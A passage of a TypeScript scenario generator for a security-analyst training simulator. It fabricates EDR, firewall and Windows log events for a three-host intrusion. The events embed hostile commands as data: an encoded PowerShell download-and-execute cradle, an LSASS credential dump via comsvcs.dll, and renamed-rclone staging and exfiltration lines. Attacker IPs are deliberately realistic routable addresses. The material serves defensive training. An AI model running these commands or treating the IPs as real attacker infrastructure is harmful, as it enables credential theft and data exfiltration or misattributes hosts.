/**
 * Scenario pack: "Multi-Host Intrusion - Foothold, Lateral Move, Staging"
 *
 * ADVANCED tier. A single hands-on-keyboard operator moves across THREE Windows
 * hosts in one evening, on the way to a ransomware deployment that a night-shift
 * analyst interrupts. It is deliberately a MULTI-INCIDENT scenario: each host is
 * its own EDR incident (its own isolated case in the console's Incidents page),
 * and the three are correlated into one campaign by a shared operator, a shared
 * C2 domain, and a tight timeline.
 *
 *   Incident 1 (FIN-WS-08) , Initial access: a macro-enabled invoice spawns an
 *                             encoded-PowerShell Cobalt Strike beacon. edr.
 *   Incident 2 (FS-SRV-03) , Lateral move + credential access: PsExec landing,
 *                             then an LSASS MiniDump that captures svc_backup's
 *                             secret (svc_backup has a live service session here).
 *                             hybrid (host + AD logon).
 *   Incident 3 (BKP-SRV-02) - Lateral move with the stolen svc_backup credential,
 *                             then collection + exfil by a renamed rclone. edr.
 *
 * The learning point is scoping a campaign across hosts: the same operator, the
 * same infrastructure, three separate endpoints, investigated as three EDR cases
 * that a good analyst ties together, following the ACCOUNT that each step steals
 * and reuses.
 *
 * SOURCES: edr (CrowdStrike Falcon), firewall (Palo Alto NGFW), windows_security
 * (member-server Windows Security log).
 *
 * IOCs follow the live feed's convention (validate:feed:integrity D-02): realistic
 * routable addresses and domains, documentation ranges or .example names would
 * stand out from the benign noise and give the attack away. No well-known shared
 * infrastructure (CDN/cloud front-ends) is used as an attacker address.
 *
 * NOTE: register in scenarios.ts with difficulty "advanced".
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { hashString } from "@/lib/sim/rng";
import { panWeb, panConnection } from "@/lib/sim/emitters/paloalto";
import { csProcess, csProcessAccess, csNetwork, csDns, csAlert, csFile } from "@/lib/sim/emitters/crowdstrike";
import { sysmonProcess, sysmonProcessAccess, sysmonFile } from "@/lib/sim/emitters/sysmon";
import { mailDelivered, mailClick } from "./corroboratingTelemetry.events";
import { winLogon, winServiceInstall, winDetailedShareAccess, domainSidFor } from "@/lib/sim/emitters/windowsSecurity";

export function buildMultiHostIntrusionScenario(
  scenarioId = "multi-host-intrusion-2026",
): ScenarioBundle {
  const B = new Date("2026-08-19T18:40:00Z").getTime();
  const SEC = 1_000;
  const MIN = 60_000;
  const T = (ms: number) => new Date(B + ms).toISOString();
  // Deterministic sub-minute jitter (2–48 s) so the feed never reads as a
  // machine emitting one event exactly per minute. Seeded by the event id, so a
  // rebuild is bit-for-bit identical. Every base offset below is chosen so that
  // adding up to 48 s of jitter cannot reorder two events (all are ≥ 60 s apart,
  // except deliberately sequenced sub-minute steps that carry their own spacing).
  // A session-end record is written when the session ENDS: start + elapsed.
  const after = (iso: string, sec: number) => new Date(Date.parse(iso) + sec * SEC).toISOString();
  const J = (baseMs: number, seed: string) => T(baseMs + (2 + (hashString(`jit:${seed}`) % 47)) * SEC);

  // One campaign, three host incidents, each its own isolated EDR case.
  const INC_WS = "inc:mhi:ws";    // FIN-WS-08, initial access
  const INC_FS = "inc:mhi:fs";    // FS-SRV-03, lateral + credential access
  const INC_BK = "inc:mhi:bkp";   // BKP-SRV-02, lateral (stolen cred) + collection + exfil

  const ws  = { hostname: "FIN-WS-08",  ip: "10.20.6.28" };
  const fs  = { hostname: "FS-SRV-03",  ip: "10.20.7.33" };
  const bkp = { hostname: "BKP-SRV-02", ip: "10.20.7.52" };
  const victim = { email: "n.harel@nexacorp.com", sam: "n.harel" };
  // svc_backup is a backup SERVICE account: it has a userPrincipalName (so the
  // user field populates) but no mailbox. It runs as a service on FS-SRV-03, which
  // is exactly why its secret is resident in that host's LSASS and is captured by
  // the MiniDump, the credential the operator then reuses to reach BKP-SRV-02.
  const svc = { upn: "svc_backup@nexacorp.com", sam: "svc_backup" };

  // C2 / exfil infrastructure (realistic hosting addresses, see header).
  const c2 = "cdn-sync-eu.net";
  const c2ip = "45.137.101.22";
  const exfilHost = "store.filedrop-transfer.net";
  const exfilIp = "92.118.39.84";

  const macroDocHash = makeSha256("multihost_invoice_q3_macro_docm_2026");
  // The beacon lives in memory (no file); the images below are genuine, clean
  // Microsoft binaries, their hashes are NOT indicators of compromise.
  const psHash       = makeSha256("windows_powershell_exe_system32_clean");
  const cmdHash      = makeSha256("windows_cmd_exe_system32_clean");
  const rcloneHash   = makeSha256("multihost_renamed_rclone_svchost_update_2026");

  // Full, harmless, decodable -enc payload (decodes to `IEX (New-Object
  // Net.WebClient).DownloadString('https://cdn-sync-eu.net/agent/stage1.ps1')`).
  // The stage-1 URL is fictional; no real malware is referenced.
  const encPayload =
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8A" +
    "dwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHMAeQBuAGMALQBlAHUA" +
    "LgBuAGUAdAAvAGEAZwBlAG4AdAAvAHMAdABhAGcAZQAxAC4AcABzADEAJwApAA==";

  const cxN = "nexacorp" as const;

  // Windows PIDs are handle-table indices, always multiples of 4.
  const PID = {
    winword: 5044, ws_cmd: 6112, ws_ps: 6180,               // FIN-WS-08
    fs_psexesvc: 4188, fs_cmd: 4212, fs_rundll: 4360, lsass: 944, // FS-SRV-03
    bk_stage: 7720, bk_upload: 7752, bk_cmd: 7604,          // BKP-SRV-02
    ws_chrome: 5520, ws_explorer: 3320,                      // FIN-WS-08 (browser and the user's shell)
    fs_services: 676, fs_psexec_client: 4540,                // FS-SRV-03
    bk_services: 668, bk_psexesvc: 7588, bk_mkdir: 7700,     // BKP-SRV-02
  };
  const CHROME_PATH = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
  const chromeUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36";
  const lureUrl = "https://supplier-invoices-nexa.com/inv/view?id=4471";
  const psexesvcHash = makeSha256("sysinternals_psexesvc_exe_clean");
  const psexecClientHash = makeSha256("sysinternals_psexec_exe_clean");
  // Per-host emitter contexts for the corroborating events below.
  const csWs = { companyId: cxN, host: ws.hostname, srcIp: ws.ip, user: victim.email, incidentId: INC_WS };
  const csFsH = { companyId: cxN, host: fs.hostname, srcIp: fs.ip, user: victim.email, incidentId: INC_FS };
  const csBk = { companyId: cxN, host: bkp.hostname, srcIp: bkp.ip, user: svc.upn, incidentId: INC_BK };

  const events: TelemetryEvent[] = [
    // ═══════════ BASELINE, svc_backup's credential source ═══════════
    // svc_backup runs the backup agent as a Windows service on FS-SRV-03 (Type 5
    // service logon). That is why its secret is resident in FS-SRV-03's LSASS and
    // is captured by the MiniDump at 19:00, and therefore why the operator can
    // reuse it to reach BKP-SRV-02. Baseline (pre-incident), so it is not itself
    // an alert; it is the evidence that makes the cross-host hop explicable.
    {
      ...winLogon({
        companyId: cxN, id: "evt_mhi_fs0_svc_session", ts: new Date(B - 3 * 60 * MIN).toISOString(),
        host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`, logSource: "windows_security",
        targetUser: svc.sam, userEmail: svc.upn, logonType: 5, authPackage: "Negotiate", workstation: fs.hostname,
        logonProcess: "Advapi  ", severity: "informational",
        description: "Service logon (Type 5) for svc_backup on FS-SRV-03 at 15:40, the backup agent's own session. It means svc_backup's credential material is resident in this host's LSASS.",
      }),
      is_baseline: true,
    },

    // ═══════════ INCIDENT 1 - FIN-WS-08 (initial access) ═══════════
    // 1. The macro invoice is downloaded from a lookalike supplier portal (firewall).
    //    A URL-filtering + file record: the proxy decrypts corporate web egress, so the
    //    full path and the downloaded object are visible (THREAT/file after the fix).
    panWeb({
      companyId: cxN, id: "evt_mhi_ws1_download", ts: J(0, "ws1"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      userTitle: "Accounts Payable Clerk", incidentId: INC_WS, severity: "low",
      url: "https://supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm", domain: "supplier-invoices-nexa.com",
      category: "business-and-economy", action: "alert", dstIp: "91.215.85.142", bytesIn: 88_320,
      file: { name: "Invoice_Q3_4471.docm", path: "/inv/Invoice_Q3_4471.docm", sha256: macroDocHash }, fileType: "ms-office",
      description: "FIN-WS-08 downloaded Invoice_Q3_4471.docm from a lookalike supplier portal at 18:40, allowed under the category business-and-economy.",
    }),
    // 2. The enabled macro spawns cmd.exe under WINWORD.EXE.
    csProcess({
      companyId: cxN, id: "evt_mhi_ws2_macro_spawn", ts: J(3 * MIN, "ws2"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe",
      cmdline: `cmd.exe /c powershell -nop -w hidden -enc ${encPayload}`,
      parentName: "WINWORD.EXE", parentPid: PID.winword, pid: PID.ws_cmd, integrity: "medium",
      mitre: "T1059.003", tactic: "Execution", severity: "high", incidentId: INC_WS,
      description: "WINWORD.EXE spawned cmd.exe at 18:43 after the invoice macro was enabled.",
    }),
    // 3. THE FOOTHOLD CRUX, encoded PowerShell decodes to a download cradle / beacon.
    csProcess({
      companyId: cxN, id: "evt_mhi_ws3_beacon", ts: J(3 * MIN + 12 * SEC, "ws3"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`,
      parentName: "cmd.exe", parentPid: PID.ws_cmd, pid: PID.ws_ps, integrity: "medium",
      sha256: psHash, signed: true, signatureSubject: "Microsoft Corporation",
      isDetection: true, mitre: "T1059.001", tactic: "Execution", severity: "critical", incidentId: INC_WS,
      description: "cmd.exe launched an encoded PowerShell whose payload decodes to a DownloadString cradle that pulled and injected a Cobalt Strike beacon into memory.",
    }),
    // 4. The beacon resolves its C2, a DnsRequest attributed to powershell (T1071.001).
    csDns({
      companyId: cxN, id: "evt_mhi_ws4_dns", ts: J(3 * MIN + 40 * SEC, "ws4"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      domain: c2, resolvedIp: c2ip, qtype: "A",
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, pid: PID.ws_ps,
      parentName: "cmd.exe", parentPid: PID.ws_cmd, sha256: psHash,
      mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
      description: "powershell.exe (the beacon) resolved cdn-sync-eu.net, the DNS request that names the C2 and ties the outbound sessions to the beacon process.",
    }),
    // 5. The beacon's outbound C2 session, attributed to powershell on the endpoint.
    csNetwork({
      companyId: cxN, id: "evt_mhi_ws5_c2_edr", ts: J(4 * MIN, "ws5"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      remoteIp: c2ip, remotePort: 443, application: "tls", domain: c2,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, pid: PID.ws_ps,
      parentName: "cmd.exe", parentPid: PID.ws_cmd, sha256: psHash,
      mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
      description: "The endpoint recorded powershell.exe opening a TLS connection to 45.137.101.22:443, the beacon's C2 channel, attributed to the beacon process itself.",
    }),
    // 6. The firewall's view of the same beacon, an aggregated TLS session summary.
    panConnection({
      companyId: cxN, id: "evt_mhi_ws6_c2_fw", ts: after(J(4 * MIN, "ws5"), 20), host: ws.hostname, srcIp: ws.ip, user: victim.email,
      end: true, app: "ssl", domain: c2, dstIp: c2ip, category: "unknown", action: "allow",
      bytesOut: 4_812, bytesIn: 1_365, elapsedSec: 20, sessionEndReason: "tcp-fin",
      mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
      description: "The firewall's session-end record for the beacon's TLS session from FIN-WS-08 to cdn-sync-eu.net: 20 seconds, a few kilobytes each way, to an uncategorised, newly seen domain, the shape of a C2 check-in. Host only (no decryption); byte totals are final at session end.",
    }),
    // 7. The Falcon detection that opened incident 1.
    {
      ...csAlert({
        companyId: cxN, id: "evt_mhi_ws7_alert", ts: J(5 * MIN, "ws7"), host: ws.hostname, srcIp: ws.ip, user: victim.email,
        threatName: "EncodedPowerShellBeaconUnderOffice", severity: "critical", mitre: "T1059.001", tactic: "Execution",
        technique: "Command and Scripting Interpreter: PowerShell", processTree: "WINWORD.EXE > cmd.exe > powershell.exe",
        processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, sha256: psHash, pid: PID.ws_ps,
        parentPath: "C:\\Windows\\System32\\cmd.exe",
        action: "detected", incidentId: INC_WS,
        description: "Falcon raised a Critical detection on FIN-WS-08: encoded PowerShell decoded an in-memory beacon under WINWORD.EXE, with a repeating TLS heartbeat to external infrastructure.",
      }),
      edr_scope: "edr",
    },

    // ═══════════ INCIDENT 2 - FS-SRV-03 (lateral + credential access) ═══════════
    // 8. The foothold reaches the file server, a Type-3 NTLM logon from FIN-WS-08.
    winLogon({
      companyId: cxN, id: "evt_mhi_fs1_logon", ts: J(19 * MIN, "fs1"), host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: ws.ip,
      targetUser: victim.sam, userEmail: victim.email, logonType: 3, authPackage: "NTLM", workstation: ws.hostname,
      severity: "medium", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_FS,
      description: "A Type 3 network logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59, the foothold host reaching the file server over SMB. Logged by the member server's own Security log.",
    }),
    // 9. A PsExec landing, services.exe → PSEXESVC.exe → cmd.exe.
    csProcess({
      companyId: cxN, id: "evt_mhi_fs2_psexec", ts: J(19 * MIN + 40 * SEC, "fs2"), host: fs.hostname, srcIp: fs.ip, user: victim.email,
      processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe /c C:\\Windows\\Temp\\d.bat",
      parentName: "PSEXESVC.exe", parentPid: PID.fs_psexesvc, pid: PID.fs_cmd, integrity: "system", runAsUser: "NT AUTHORITY\\SYSTEM",
      sha256: cmdHash, signed: true, signatureSubject: "Microsoft Corporation", mitre: "T1021.002", tactic: "Lateral Movement",
      severity: "high", incidentId: INC_FS,
      description: "services.exe started PSEXESVC.exe on FS-SRV-03, which spawned cmd.exe as SYSTEM, a PsExec remote-execution landing.",
    }),
    // 10. THE CREDENTIAL-THEFT CRUX, rundll32 comsvcs MiniDump against lsass, full access.
    csProcessAccess({
      companyId: cxN, id: "evt_mhi_fs3_lsass", ts: J(20 * MIN + 30 * SEC, "fs3"), host: fs.hostname, srcIp: fs.ip, user: victim.email,
      processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
      cmdline: `rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump ${PID.lsass} C:\\Windows\\Temp\\lsass.dmp full`,
      parentName: "cmd.exe", parentPid: PID.fs_cmd, pid: PID.fs_rundll, targetProcess: "lsass.exe", targetPid: PID.lsass, grantedAccess: "0x1FFFFF",
      threatName: "LsassMiniDumpViaComsvcs", mitre: "T1003.001", tactic: "Credential Access",
      technique: "OS Credential Dumping: LSASS Memory", severity: "critical", isDetection: true, incidentId: INC_FS,
      description: "rundll32.exe called comsvcs.dll MiniDump against lsass.exe with full access, writing C:\\Windows\\Temp\\lsass.dmp. lsass.dmp contains every secret cached in LSASS, including svc_backup's, whose service session is live on this host.",
    }),
    // 11. The Falcon detection that opened incident 2.
    {
      ...csAlert({
        companyId: cxN, id: "evt_mhi_fs4_alert", ts: J(21 * MIN, "fs4"), host: fs.hostname, srcIp: fs.ip, user: victim.email,
        threatName: "LsassMiniDumpViaComsvcs", severity: "critical", mitre: "T1003.001", tactic: "Credential Access",
        technique: "OS Credential Dumping: LSASS Memory", processTree: "services.exe > PSEXESVC.exe > cmd.exe > rundll32.exe",
        processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
        cmdline: `rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump ${PID.lsass} C:\\Windows\\Temp\\lsass.dmp full`,
        sha256: makeSha256("comsvcs_minidump_lsass_dmp"), pid: PID.fs_rundll, parentPath: "C:\\Windows\\System32\\cmd.exe",
        runAsUser: "NT AUTHORITY\\SYSTEM", action: "detected", incidentId: INC_FS,
        description: "Falcon raised a Critical detection on FS-SRV-03: LSASS memory was dumped via comsvcs.dll MiniDump by a PsExec-launched shell, moments after a network logon from FIN-WS-08.",
      }),
      edr_scope: "hybrid",
    },

    // ═══════════ INCIDENT 3 - BKP-SRV-02 (stolen-cred lateral + collection + exfil) ═══════════
    // 12. THE MISSING LINK, svc_backup (dumped from FS-SRV-03) logs on to BKP-SRV-02
    //     over SMB from the foothold host FS-SRV-03 (10.20.7.33). Type-3, member server.
    winLogon({
      companyId: cxN, id: "evt_mhi_bk0_logon", ts: J(30 * MIN, "bk0"), host: bkp.hostname, fqdn: `${bkp.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: fs.ip,
      targetUser: svc.sam, userEmail: svc.upn, logonType: 3, authPackage: "NTLM", workstation: fs.hostname,
      severity: "high", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_BK,
      description: "A Type 3 network logon for svc_backup arrived on BKP-SRV-02 from FS-SRV-03 (10.20.7.33) at 19:10, the stolen backup credential reused to reach the third host. NTLM authentication, LmPackageName NTLM V2.",
    }),
    // 13. PsExec staging over SMB - PSEXESVC.exe written to ADMIN$, svcctl over IPC$.
    winDetailedShareAccess({
      companyId: cxN, id: "evt_mhi_bk1_admin_share", ts: J(30 * MIN + 25 * SEC, "bk1a"), host: bkp.hostname, fqdn: `${bkp.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: fs.ip, targetUser: svc.sam, userEmail: svc.upn,
      shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: "PSEXESVC.exe",
      accessMask: "0x2", accessList: "%%4417", severity: "high", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_BK,
      description: "svc_backup wrote PSEXESVC.exe into the ADMIN$ share on BKP-SRV-02 from 10.20.7.33, the PsExec service binary being dropped over SMB.",
    }),
    winDetailedShareAccess({
      companyId: cxN, id: "evt_mhi_bk2_ipc_share", ts: J(30 * MIN + 40 * SEC, "bk1b"), host: bkp.hostname, fqdn: `${bkp.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: fs.ip, targetUser: svc.sam, userEmail: svc.upn,
      shareName: "\\\\*\\IPC$", shareLocalPath: "", relativeTargetName: "svcctl",
      accessMask: "0x12019f", accessList: "%%4416\n\t\t\t\t%%4417", severity: "medium", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_BK,
      description: "svc_backup opened the svcctl named pipe on BKP-SRV-02's IPC$ share, the Service Control Manager RPC endpoint PsExec uses to create and start its service.",
    }),
    // 14. 7045, the PSEXESVC service is installed on BKP-SRV-02.
    winServiceInstall({
      companyId: cxN, id: "evt_mhi_bk3_service", ts: J(31 * MIN, "bk3"), host: bkp.hostname, fqdn: `${bkp.hostname}.nexacorp.local`,
      logSource: "windows_security", targetUser: svc.sam, userEmail: svc.upn,
      serviceName: "PSEXESVC", imagePath: "%SystemRoot%\\PSEXESVC.exe", accountName: "LocalSystem",
      serviceType: "user mode service", startType: "demand start",
      installerSid: domainSidFor(cxN, svc.sam),
      severity: "high", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_BK,
      description: "Service Control Manager logged 7045, the PSEXESVC service installed on BKP-SRV-02, running as LocalSystem, created in the session opened by svc_backup. This is how the operator gained SYSTEM execution on the third host.",
    }),
    // 15. THE COLLECTION CRUX, a renamed rclone stages the finance share (PID bk_stage).
    csProcess({
      companyId: cxN, id: "evt_mhi_bk4_stage", ts: J(34 * MIN, "bk4"), host: bkp.hostname, srcIp: bkp.ip, user: svc.upn,
      processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
      cmdline: "svchost-update.exe copy \\\\FS-SRV-03\\Finance R:\\stage --transfers 16", parentName: "cmd.exe", parentPid: PID.bk_cmd, pid: PID.bk_stage,
      sha256: rcloneHash, signed: false, originalFileName: "rclone.exe", mitre: "T1039", tactic: "Collection", severity: "high", incidentId: INC_BK,
      description: "svchost-update.exe, an unsigned binary in ProgramData, recursively copied \\\\FS-SRV-03\\Finance into R:\\stage on BKP-SRV-02 (the collection step).",
    }),
    // 16. THE EXFIL CRUX, a NEW rclone process (its own PID) pushes the staged archive out.
    //     (#7: the copy and the upload are two separate rclone invocations, so they are two
    //     distinct processes with two distinct PIDs, one PID never carries two command lines.)
    csNetwork({
      companyId: cxN, id: "evt_mhi_bk5_exfil_proc", ts: J(41 * MIN, "bk5"), host: bkp.hostname, srcIp: bkp.ip, user: svc.upn,
      remoteIp: exfilIp, remotePort: 443, application: "tls", domain: exfilHost,
      processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
      cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", pid: PID.bk_upload, parentName: "cmd.exe", parentPid: PID.bk_cmd,
      sha256: rcloneHash, isDetection: true, mitre: "T1567.002", tactic: "Exfiltration", severity: "critical", incidentId: INC_BK,
      description: "A second svchost-update.exe invocation (a new process) opened a sustained TLS session to store.filedrop-transfer.net and uploaded the staged R:\\stage volumes.",
    }),
    // 17. The firewall's session-end record of the same upload, where the VOLUME lives.
    panConnection({
      companyId: cxN, id: "evt_mhi_bk6_fw", ts: after(J(41 * MIN, "bk5"), 60), host: bkp.hostname, srcIp: bkp.ip, user: svc.upn,
      end: true, app: "ssl", domain: exfilHost, dstIp: exfilIp, category: "online-storage-and-backup",
      action: "allow", bytesOut: 3_650_722_000, bytesIn: 262_144, elapsedSec: 60, sessionEndReason: "tcp-fin",
      mitre: "T1567.002", tactic: "Exfiltration", severity: "high", incidentId: INC_BK,
      description: "The firewall's TRAFFIC session-end record: 3.65 GB uploaded from BKP-SRV-02 to store.filedrop-transfer.net over a 60-second session (~490 Mbps on the server's uplink), category online-storage-and-backup, allowed. The byte total is final at session close, not at the start.",
    }),
    // 18. The Falcon detection that opened incident 3.
    {
      ...csAlert({
        companyId: cxN, id: "evt_mhi_bk7_alert", ts: J(43 * MIN, "bk7"), host: bkp.hostname, srcIp: bkp.ip, user: svc.upn,
        threatName: "MassStagingAndCloudExfil", severity: "critical", mitre: "T1567.002", tactic: "Exfiltration",
        technique: "Exfiltration to Cloud Storage", processTree: "cmd.exe > svchost-update.exe", action: "detected",
        processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
        cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", sha256: rcloneHash, pid: PID.bk_upload,
        parentPath: "C:\\Windows\\System32\\cmd.exe", incidentId: INC_BK,
        description: "Falcon raised a Critical detection on BKP-SRV-02: an unsigned rclone-derived binary copied a file share and transferred multiple gigabytes to an online-storage host.",
      }),
      edr_scope: "edr",
    },

    // ═══════════ INCIDENT 1, corroborating sources (email gateway, DNS, endpoint file/process, beacon cadence) ═══════════
    // The lure: delivered by the mail gateway, then clicked, before the portal download in evt_mhi_ws1.
    mailDelivered({
      id: "evt_mhi_ws0a_lure_delivered", ts: T(-3 * MIN - 20 * SEC), incidentId: INC_WS,
      user: victim.email, userTitle: "Accounts Payable Clerk", qid: "5C81D3A790",
      sender: "accounts@supplier-invoices-nexa.com", headerFrom: "\"Nexa Supplier Billing\" <accounts@supplier-invoices-nexa.com>",
      subject: "Invoice Q3-4471 - payment due this week", messageId: "<9e17b3d2-61c4-4f08-a2d5-0b7c3e49a118@supplier-invoices-nexa.com>",
      senderIp: "193.233.48.76", url: lureUrl, domain: "supplier-invoices-nexa.com",
      urlRewritten: "https://urldefense.proofpoint.com/v2/url?u=https-3A__supplier-2Dinvoices-2Dnexa.com_inv_view-3Fid-3D4471",
      spf: "pass", dkim: "pass", dmarc: "none", phishScore: 34, spamScore: 9, mitre: "T1566.002", tactic: "Initial Access",
      description: "A mail titled Invoice Q3-4471 was delivered to n.harel from accounts@supplier-invoices-nexa.com with a link to the supplier portal.",
    }),
    mailClick({
      id: "evt_mhi_ws0b_lure_click", ts: T(-8 * SEC), incidentId: INC_WS,
      user: victim.email, userTitle: "Accounts Payable Clerk", qid: "5C81D3A790", sender: "accounts@supplier-invoices-nexa.com",
      messageId: "<9e17b3d2-61c4-4f08-a2d5-0b7c3e49a118@supplier-invoices-nexa.com>",
      url: lureUrl, domain: "supplier-invoices-nexa.com", clickIp: "217.177.80.10", userAgent: chromeUa,
      description: "URL Defense recorded n.harel following the rewritten link from the Invoice Q3-4471 mail; click status permitted.",
    }),
    csDns({
      ...csWs, id: "evt_mhi_ws0c_dns_portal", ts: T(10 * SEC), severity: "low",
      domain: "supplier-invoices-nexa.com", resolvedIp: "91.215.85.142",
      processName: "chrome.exe", pid: PID.ws_chrome, processPath: CHROME_PATH, parentName: "explorer.exe", parentPid: PID.ws_explorer,
      description: "chrome.exe on FIN-WS-08 resolved supplier-invoices-nexa.com.",
    }),
    csFile({
      ...csWs, id: "evt_mhi_ws1b_docm_written", ts: T(26 * SEC), severity: "low",
      path: "C:\\Users\\n.harel\\Downloads\\Invoice_Q3_4471.docm", sha256: macroDocHash, size: 88_320,
      actorProcess: "chrome.exe", actorPid: PID.ws_chrome, actorPath: CHROME_PATH, actorParentName: "explorer.exe", actorParentPid: PID.ws_explorer,
      description: "chrome.exe wrote C:\\Users\\n.harel\\Downloads\\Invoice_Q3_4471.docm to disk.",
    }),
    csProcess({
      ...csWs, id: "evt_mhi_ws1c_word_open", ts: T(2 * MIN + 50 * SEC), severity: "low",
      processName: "WINWORD.EXE", processPath: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      cmdline: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\n.harel\\Downloads\\Invoice_Q3_4471.docm\"",
      parentName: "explorer.exe", parentPid: PID.ws_explorer, pid: PID.winword, integrity: "medium",
      sha256: makeSha256("office16_winword_exe_clean"), signed: true, signatureSubject: "Microsoft Corporation",
      description: "explorer.exe started WINWORD.EXE with the downloaded Invoice_Q3_4471.docm as its document.",
    }),
    panWeb({
      ...csWs, id: "evt_mhi_ws4c_stage1_fw", ts: T(3 * MIN + 58 * SEC), host: ws.hostname, severity: "high",
      url: `https://${c2}/agent/stage1.ps1`, domain: c2, category: "unknown", action: "alert", dstIp: c2ip, status: 200, bytesIn: 18_432,
      file: { name: "stage1.ps1", path: "/agent/stage1.ps1", size: 18_432 }, fileType: "script",
      mitre: "T1105", tactic: "Command and Control",
      description: "FIN-WS-08 downloaded /agent/stage1.ps1 from cdn-sync-eu.net, category unknown, allowed.",
    }),
    ...[
      { n: "b", ms: 5 * MIN + 41 * SEC }, { n: "c", ms: 6 * MIN + 43 * SEC }, { n: "d", ms: 7 * MIN + 40 * SEC },
    ].flatMap(({ n, ms }) => [
      panConnection({
        ...csWs, id: `evt_mhi_ws6${n}_beat_fw`, ts: after(T(ms), 20), host: ws.hostname,
        end: true, app: "ssl", domain: c2, dstIp: c2ip, category: "unknown", action: "allow",
        bytesOut: 4_700 + ms % 400, bytesIn: 1_300 + ms % 90, elapsedSec: 20, sessionEndReason: "tcp-fin",
        mitre: "T1071.001", tactic: "Command and Control", severity: "high",
        description: "Session-end record for another 20-second TLS session from FIN-WS-08 to cdn-sync-eu.net.",
      }),
    ]),

    // ═══════════ INCIDENT 2, corroborating sources on the path to FS-SRV-03 ═══════════
    csNetwork({
      ...csWs, id: "evt_mhi_fs0a_smb_connect", ts: T(19 * MIN + 30 * SEC), severity: "medium",
      remoteIp: fs.ip, remotePort: 445,
      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: `powershell.exe -nop -w hidden -enc ${encPayload}`, pid: PID.ws_ps,
      parentName: "cmd.exe", parentPid: PID.ws_cmd, sha256: psHash,
      mitre: "T1021.002", tactic: "Lateral Movement",
      description: "powershell.exe on FIN-WS-08 connected to 10.20.7.33:445 (SMB on FS-SRV-03).",
    }),
    winDetailedShareAccess({
      companyId: cxN, id: "evt_mhi_fs1a_admin_share", ts: T(19 * MIN + 44 * SEC), host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: ws.ip, targetUser: victim.sam, userEmail: victim.email,
      shareName: "\\\\*\\ADMIN$", shareLocalPath: "\\??\\C:\\Windows", relativeTargetName: "PSEXESVC.exe",
      accessMask: "0x2", accessList: "%%4417", severity: "high", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_FS,
      description: "n.harel wrote PSEXESVC.exe into the ADMIN$ share on FS-SRV-03 from 10.20.6.28.",
    }),
    winDetailedShareAccess({
      companyId: cxN, id: "evt_mhi_fs1b_ipc_share", ts: T(19 * MIN + 50 * SEC), host: fs.hostname, fqdn: `${fs.hostname}.nexacorp.local`,
      logSource: "windows_security", srcIp: ws.ip, targetUser: victim.sam, userEmail: victim.email,
      shareName: "\\\\*\\IPC$", shareLocalPath: "", relativeTargetName: "svcctl",
      accessMask: "0x12019f", accessList: "%%4416\n\t\t\t\t%%4417", severity: "medium", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_FS,
